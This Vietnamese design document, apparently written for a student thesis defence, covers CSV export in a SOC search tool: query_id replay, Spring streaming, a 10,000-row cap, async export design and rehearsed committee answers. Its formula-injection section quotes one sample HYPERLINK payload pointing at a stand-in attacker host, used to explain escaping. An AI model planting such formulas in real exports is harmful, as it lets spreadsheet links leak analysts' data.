# CSV Export Design trong SOC AI Search

## 1. CSV export dùng để làm gì?

CSV export cho phép analyst/admin tải kết quả điều tra ra file `.csv` để:

- lưu lại bằng chứng điều tra;
- chia sẻ với người khác;
- mở bằng Excel/Google Sheets;
- phục vụ báo cáo sau incident.

Trong hệ thống có 2 loại export chính:

| Loại export | Nguồn dữ liệu | Ai dùng | Mục đích |
|---|---|---|---|
| Search result CSV | Elasticsearch | Analyst/Admin | Export event logs từ kết quả search/aggregation |
| Audit CSV | PostgreSQL | Admin | Export lịch sử/audit logs của hệ thống |

---

## 2. Luồng export Search CSV

Search CSV không nhận DSL trực tiếp từ frontend. Frontend chỉ gửi `query_id`.

Luồng:

```text
User bấm Export CSV
        ↓
Frontend gửi query_id
        ↓
Backend lấy SearchPlan đã lưu trong PostgreSQL
        ↓
Backend kiểm tra quyền + validate SearchPlan
        ↓
Backend compile lại SearchPlan thành Elasticsearch DSL
        ↓
Backend query Elasticsearch
        ↓
Backend stream CSV về frontend
```

Ví dụ:

```text
GET /api/v1/search/{query_id}/export.csv
```

Backend trả:

```http
Content-Type: text/csv
Content-Disposition: attachment; filename="soc-ai-search.csv"
X-Export-Truncated: false
```

Điểm quan trọng:

> Frontend không gửi DSL, không gửi toàn bộ data, chỉ gửi `query_id`.

Lý do là frontend không phải nguồn đáng tin cậy. Người dùng có thể mở DevTools/Postman và sửa request.

---

## 3. Frontend lấy `query_id` ở đâu?

Sau khi search thành công, backend trả response có `query_id`.

Ví dụ:

```json
{
  "query_id": "890825b8-c1bc-4954-8569-ed8758dd054a",
  "original_question": "Show failed login attempts from China in the last 24h",
  "mode": "search",
  "search_plan": {
    "mode": "search"
  },
  "events": []
}
```

Frontend giữ response này trong state. Khi user bấm `Export CSV`, frontend lấy:

```text
response.query_id
```

rồi gọi export API.

---

## 4. Vì sao không cho frontend gửi DSL trực tiếp?

Nếu backend nhận DSL từ frontend, user có thể sửa request để vượt guardrail.

Ví dụ query ban đầu chỉ export failed login từ China:

```json
{
  "query": {
    "bool": {
      "filter": [
        { "terms": { "event_type": ["failed_login"] } },
        { "terms": { "country_code": ["CN"] } }
      ]
    }
  },
  "size": 10000
}
```

User có thể sửa thành:

```json
{
  "query": {
    "match_all": {}
  },
  "size": 1000000
}
```

Rủi ro:

- bỏ filter ban đầu;
- export toàn bộ event;
- tăng `size` quá lớn;
- dùng DSL ngoài phạm vi hệ thống cho phép;
- cố lấy dữ liệu không thuộc quyền.

Vì vậy hệ thống chọn cách an toàn hơn:

```text
query_id → SearchPlan đã lưu → validate → compile lại DSL → export
```

Câu trả lời ngắn:

> Em không nhận DSL từ client vì client có thể bị sửa bằng DevTools/Postman. Backend chỉ nhận `query_id`, sau đó replay SearchPlan đã validate để đảm bảo export vẫn nằm trong guardrail.

---

## 5. Stream CSV là gì?

Stream CSV nghĩa là backend ghi dữ liệu CSV trực tiếp vào HTTP response theo từng dòng/batch, thay vì tạo toàn bộ file trong RAM rồi mới gửi.

Hình dung:

```text
Backend ghi header CSV
Backend ghi dòng 1
Backend ghi dòng 2
Backend ghi dòng 3
...
Browser tải response thành file .csv
```

Ưu điểm:

- không cần giữ toàn bộ file trong bộ nhớ;
- phù hợp với export nhiều dòng;
- browser có thể nhận như file download.

### Hệ thống dùng lệnh/cơ chế gì để stream CSV?

Trong hệ thống này, stream CSV không phải là một lệnh terminal riêng. Backend dùng cơ chế có sẵn của Spring Boot/Spring MVC là `StreamingResponseBody`.

Ý tưởng chính:

```text
Controller trả ResponseEntity<StreamingResponseBody>
        ↓
Service chuẩn bị một hàm ghi vào OutputStream
        ↓
CSV writer ghi header và từng dòng CSV vào OutputStream
        ↓
Spring gửi dữ liệu đó dần dần về browser
```

Các file chính:

| Luồng | File | Vai trò |
|---|---|---|
| Search CSV controller | `backend/src/main/java/com/soc/ai/search/csv/CsvExportController.java` | Trả `ResponseEntity<StreamingResponseBody>` cho endpoint export search CSV. |
| Search CSV service | `backend/src/main/java/com/soc/ai/search/csv/CsvExportService.java` | Tạo `PreparedCsvExport`, truyền lambda `outputStream -> streamSearch(...)` hoặc `outputStream -> streamAggregation(...)`. |
| Search CSV writer | `backend/src/main/java/com/soc/ai/search/csv/CsvRowWriter.java` | Dùng `OutputStreamWriter` để ghi header, event rows hoặc aggregation rows. |
| Audit CSV controller | `backend/src/main/java/com/soc/ai/search/audit/AuditQueryController.java` | Trả `ResponseEntity<StreamingResponseBody>` cho endpoint export audit CSV. |
| Audit CSV service | `backend/src/main/java/com/soc/ai/search/audit/AuditQueryService.java` | Tạo `PreparedAuditCsvExport`, truyền lambda `outputStream -> streamAuditRows(...)`. |
| Audit CSV writer | `backend/src/main/java/com/soc/ai/search/audit/AuditCsvWriter.java` | Ghi header và từng dòng audit log vào `OutputStream`. |

Ví dụ phần quan trọng trong backend:

```java
public ResponseEntity<StreamingResponseBody> export(...) {
    var prepared = exportService.prepare(queryId);
    return ResponseEntity.ok()
            .contentType(MediaType.parseMediaType("text/csv"))
            .body(prepared.body());
}
```

Trong service, phần stream thường có dạng:

```java
return new PreparedCsvExport(
        prepared.truncated(),
        outputStream -> streamSearch(queryId, prepared, outputStream)
);
```

Và writer ghi vào HTTP response bằng:

```java
writer = new OutputStreamWriter(outputStream, StandardCharsets.UTF_8);
```

Frontend nhận response dưới dạng file bằng `response.blob()` trong:

- `frontend/src/services/csv-export-api.ts`
- `frontend/src/services/history-api.ts`

Câu trả lời ngắn khi bảo vệ:

> Em dùng `StreamingResponseBody` của Spring Boot để stream CSV. Controller trả về `ResponseEntity<StreamingResponseBody>`, service ghi từng dòng CSV vào `OutputStream`, còn frontend nhận response bằng `blob()` để tải file. Cách này tránh phải build toàn bộ file CSV trong RAM trước khi gửi.

---

## 6. Search export và Audit export có giống nhau không?

Không hoàn toàn giống.

### Search result export

```text
Frontend gửi query_id
Backend lấy SearchPlan từ PostgreSQL
Backend validate/compile lại DSL
Backend query Elasticsearch
Backend stream event CSV
```

Search export dùng Elasticsearch vì dữ liệu event logs nằm trong Elasticsearch.

### Audit export

```text
Frontend gửi filter audit hiện tại
Backend query PostgreSQL audit/history table
Backend stream audit CSV
```

Audit export không cần `query_id` vì nó export trực tiếp danh sách audit logs theo filter hiện tại.

---

## 7. Giới hạn 10.000 dòng

Cả 2 loại export đều giới hạn 10.000 dòng trong MVP:

| Loại export | Limit |
|---|---:|
| Search result CSV | 10.000 dòng |
| Audit CSV | 10.000 dòng |

Lý do:

- tránh một request export quá lớn làm nặng backend;
- tránh Elasticsearch/PostgreSQL bị query quá tải;
- tránh file quá lớn gây chậm trình duyệt;
- giảm nguy cơ abuse;
- phù hợp phạm vi MVP và demo.

Giải thích kỹ hơn:

Trong hệ thống SOC, dữ liệu event có thể tăng rất nhanh. Một câu hỏi tự nhiên như "show all events in the last 90 days" có thể match hàng trăm nghìn hoặc hàng triệu dòng. Nếu cho phép export không giới hạn ngay trong một HTTP request đồng bộ, hệ thống có một số rủi ro:

| Rủi ro | Vì sao đáng ngại |
|---|---|
| Timeout HTTP | Export quá lâu có thể vượt timeout của browser, reverse proxy, backend hoặc load balancer. |
| Tốn tài nguyên backend | Backend phải giữ kết nối lâu, đọc nhiều batch, ghi nhiều dữ liệu và xử lý lỗi giữa chừng. |
| Tải nặng Elasticsearch/PostgreSQL | Query export lớn có thể cạnh tranh tài nguyên với search realtime của user khác. |
| File quá lớn với trình duyệt | Browser tải file lớn dễ chậm, tốn RAM/disk, hoặc người dùng tưởng hệ thống bị treo. |
| Khó retry/resume | Nếu export 800.000 dòng rồi lỗi mạng, request đồng bộ thường phải chạy lại từ đầu. |
| Nguy cơ abuse | User có quyền export có thể vô tình hoặc cố ý tạo export cực lớn nhiều lần. |

Vì vậy giới hạn 10.000 dòng trong MVP là một quyết định an toàn:

- đủ để demo và kiểm chứng luồng export;
- đủ lớn cho nhiều tình huống điều tra nhanh;
- giảm rủi ro vận hành;
- dễ giải thích rõ khi kết quả bị cắt bằng `X-Export-Truncated=true`;
- giữ trọng tâm đồ án ở pipeline search an toàn thay vì bài toán data export quy mô lớn.

Câu trả lời khi hội đồng hỏi:

> Em giới hạn 10.000 dòng vì đây là MVP. SOC logs có thể rất lớn, nếu export không giới hạn qua một HTTP request đồng bộ thì dễ timeout, tốn RAM/network và ảnh hưởng người dùng khác. Giới hạn này giúp hệ thống ổn định và vẫn đủ cho demo điều tra.

---

## 8. Nếu kết quả hơn 10.000 dòng thì file CSV trông như thế nào?

File CSV vẫn là file CSV bình thường, chỉ chứa 10.000 dòng đầu tiên.

Ví dụ query match 25.000 events:

```csv
event_id,timestamp,source,severity,event_type,user,host,ip,country_code,message
...
10000 dòng event đầu tiên
```

Backend không thêm dòng cảnh báo vào cuối file. Thay vào đó backend trả HTTP response header:

```http
X-Export-Truncated: true
```

Nếu không bị cắt:

```http
X-Export-Truncated: false
```

Ý nghĩa:

```text
X-Export-Truncated: true
```

nghĩa là:

> Có nhiều hơn 10.000 dòng match với filter/query, nhưng backend chỉ export 10.000 dòng đầu tiên.

Có thể kiểm tra header bằng:

- Browser DevTools → Network → chọn request export → Response Headers;
- Postman → tab Headers;
- Swagger UI → Response headers;
- `curl -D headers.txt -o file.csv ...`.

---

## 9. Vì sao không export hàng triệu dòng ngay?

Export hàng triệu dòng là khả thi, nhưng không nên làm bằng một HTTP request đồng bộ trong MVP.

Nghiên cứu hướng production-grade cho export lớn:

1. **Async export job**
   - User bấm export.
   - Backend tạo `export_id`.
   - Backend trả ngay response kiểu `202 Accepted`.
   - Job chạy nền, không giữ request HTTP của user quá lâu.
   - User có thể xem trạng thái: `PENDING`, `RUNNING`, `COMPLETED`, `FAILED`.
   - Khi job xong, user tải file bằng một endpoint khác.

   Ví dụ flow:

   ```text
   POST /api/v1/exports
       body: { query_id: "...", type: "search_csv" }
       ↓
   202 Accepted
       body: { export_id: "..." }
       ↓
   GET /api/v1/exports/{export_id}
       → RUNNING / COMPLETED / FAILED
       ↓
   GET /api/v1/exports/{export_id}/download
       → tải file CSV/CSV.GZ
   ```

2. **Batching**
   - Đọc dữ liệu theo batch, ví dụ 5.000 hoặc 10.000 dòng/lần.
   - Mỗi batch ghi tiếp vào file tạm.
   - Không giữ toàn bộ dữ liệu trong RAM.
   - Nếu một batch lỗi, job có thể ghi trạng thái lỗi rõ ràng.

3. **Elasticsearch `search_after` hoặc Point-In-Time**
   - Không dùng `from/size` quá sâu.
   - `from/size` sâu rất tốn chi phí vì Elasticsearch phải bỏ qua nhiều kết quả trước đó.
   - `search_after` dùng sort key của dòng cuối batch trước để lấy batch tiếp theo.
   - Point-In-Time (PIT) giúp giữ một ảnh chụp logic của index trong lúc export, tránh dữ liệu thay đổi làm lệch thứ tự.

   Ví dụ ý tưởng:

   ```text
   Open PIT
       ↓
   Query batch 1 size=5000 sort=[timestamp,id]
       ↓
   Lưu search_after của dòng cuối
       ↓
   Query batch 2 bằng search_after
       ↓
   Lặp đến khi hết dữ liệu hoặc đạt quota
       ↓
   Close PIT
   ```

4. **File storage**
   - Ghi file ra disk/object storage.
   - Cho user tải sau.
   - Có thể tự động xóa file sau một thời gian, ví dụ 24h.

5. **Compression**
   - Xuất `.csv.gz` để giảm dung lượng.
   - Log thường là text nên nén rất hiệu quả.

6. **Quota và permission**
   - Chỉ role cao được export lớn.
   - Giới hạn số job/ngày.
   - Có audit log cho export lớn.

7. **Cancel/retry**
   - User/admin có thể hủy job nếu export quá lâu.
   - Job thất bại có trạng thái rõ ràng để user không phải đoán.

8. **Progress metadata**
   - Lưu số dòng đã ghi.
   - Lưu thời điểm bắt đầu/kết thúc.
   - Lưu filter/query dùng cho export.
   - Lưu người tạo export để phục vụ audit.

Vì sao async job tốt hơn request đồng bộ?

| Tiêu chí | Request đồng bộ hiện tại | Async export job |
|---|---|---|
| Phù hợp MVP | Tốt | Hơi phức tạp |
| Export vài nghìn dòng | Tốt | Tốt |
| Export hàng triệu dòng | Không nên | Phù hợp hơn |
| Retry/resume | Khó | Dễ thiết kế hơn |
| Theo dõi tiến độ | Không rõ | Có thể hiển thị progress |
| Tải hệ thống | Dễ tạo spike | Có thể queue/rate limit |

Câu trả lời gọn:

> Em đã nghiên cứu hướng export lớn. Với hàng triệu dòng, cách đúng là async export job kết hợp batching/search_after/PIT và lưu file tạm, chứ không nên stream trực tiếp trong một request như MVP.

---

## 10. CSV formula injection là gì?

CSV thường được mở bằng Excel/Google Sheets. Nếu một ô bắt đầu bằng:

```text
=
+
-
@
```

ứng dụng bảng tính có thể hiểu đó là công thức.

Ví dụ attacker tạo log message:

```text
=HYPERLINK("https://evil.example/steal","Click")
```

Nếu export thẳng ra CSV, khi analyst mở bằng Excel, nó có thể bị diễn giải thành formula.

Cách chống:

- backend escape các giá trị nguy hiểm;
- biến chúng thành text thường;
- ví dụ thêm dấu `'` trước công thức.

Ví dụ:

```csv
'=HYPERLINK("https://evil.example/steal","Click")
```

Câu trả lời khi hội đồng hỏi:

> Vì CSV có thể được mở bằng Excel, nên dữ liệu log bắt đầu bằng ký tự công thức có thể bị Excel diễn giải như formula. Backend escape các giá trị bắt đầu bằng `=`, `+`, `-`, `@` để đảm bảo nội dung log chỉ là text.

---

## 11. Các câu hỏi hội đồng có thể hỏi

### Hỏi: Vì sao export bằng `query_id`?

Vì `query_id` trỏ đến SearchPlan đã được backend validate và lưu lại. Frontend chỉ gửi ID, backend tự replay query một cách an toàn.

### Hỏi: Vì sao không gửi DSL từ frontend?

Vì frontend có thể bị sửa request bằng DevTools/Postman. Nếu nhận DSL từ frontend, user có thể bỏ filter, tăng size hoặc dùng query ngoài guardrail.

### Hỏi: Nếu dữ liệu thay đổi sau khi search thì export có giống lúc search không?

Search export hiện tại replay SearchPlan trên Elasticsearch hiện tại, nên export phản ánh dữ liệu mới nhất tại thời điểm export, không phải snapshot tuyệt đối tại thời điểm search. Đây là trade-off của MVP. Production có thể lưu snapshot hoặc dùng PIT/export job để đảm bảo tính nhất quán mạnh hơn.

### Hỏi: Vì sao giới hạn 10.000 dòng?

Để tránh export quá lớn gây timeout, tốn tài nguyên và ảnh hưởng hệ thống. Đây là giới hạn an toàn cho MVP.

### Hỏi: Nếu muốn export hàng triệu dòng thì làm sao?

Dùng async export job, batching, `search_after`/PIT, file storage, compression và quota.

### Hỏi: Audit CSV và Search CSV khác gì nhau?

Search CSV export event logs từ Elasticsearch bằng `query_id`. Audit CSV export audit/history logs từ PostgreSQL theo filter hiện tại.

### Hỏi: Header `X-Export-Truncated` dùng để làm gì?

Để báo frontend biết file đã bị cắt ở giới hạn 10.000 dòng hay chưa.

### Hỏi: CSV có export raw log không?

Search CSV không export raw log trong MVP để giảm rủi ro lộ dữ liệu nhạy cảm. Raw log chỉ hiển thị trong event detail cho role có quyền.
